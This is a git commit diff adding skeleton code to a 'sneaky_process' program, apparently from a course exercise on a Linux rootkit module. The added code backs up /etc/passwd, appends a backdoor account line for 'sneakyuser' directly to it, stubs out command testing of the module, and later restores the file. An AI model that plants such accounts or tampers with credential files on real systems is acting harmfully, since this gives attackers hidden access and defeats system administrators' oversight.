2c6b00c738ded7e00bd5378c15d04e69a9b64b8b
prathikshaa-r <pratsr996@gmail.com>
2019-04-08 01:01:12 -0400

    Sneaky Process Skeleton.todo: take inputs from user. execute commands. also, load and unload sneaky_mod

--- src/sneaky_process.c
+++ src/sneaky_process.c
@@ -40,11 +40,22 @@ int main(void) {
   printf("sneaky_process pid = %d\n", getpid());
   /*-------------------------------2------------------------------*/
   // copy /etc/passwd to /tmp/passwd
-  char *const command[] = {"/bin/ls", "-l"};
+  char *const command[] = {"/bin/ls", "-l", 0}; // needs to be null terminated
   run_command(command[0], command);
+
+  char *const cp_passwd_file[] = {"/bin/cp", "/etc/passwd", "/tmp/passwd", 0};
+  run_command(cp_passwd_file[0], cp_passwd_file);
+  printf("Copied /etc/passwd to /tmp/passwd");
 
   // add following line to end of tmp/passwd
   // sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
+  FILE *fp;
+
+  fp = fopen("/etc/passwd", "a");
+  fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
+  fclose(fp);
+
+  printf("\nappended sneaky line to /etc/passwd\n\n");
 
   /*-------------------------------3------------------------------*/
   // load sneaky module using insmod()
@@ -54,6 +65,19 @@ int main(void) {
   /*-------------------------------4------------------------------*/
   // while(1)
   // take keyboard input until "q"-quit
+  // execute the commands from user -- to test sneaky_mod
+  int i = 10;
+  while(i>0) {
+    printf("Enter a command for testing\n");
+    size_t buf_size = 32;
+    char buffer[buf_size];
+    char *b = buffer;
+
+    i--;
+  }
+  
+  char *const test_open[] = {"/bin/cat", "/etc/passwd", 0}; // needs to be null terminated
+  run_command(test_open[0], test_open);
 
   // test malicious behavior
 
@@ -64,4 +88,8 @@ int main(void) {
   /*-------------------------------6------------------------------*/
 
   // cp /tmp/passwd to /etc/psswd
+  char *const reset_passwd_file[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd", 0};
+  run_command(reset_passwd_file[0], reset_passwd_file);
+  printf("\nafter resetting /etc/passwd\n\n" );
+  run_command(test_open[0], test_open);
 }
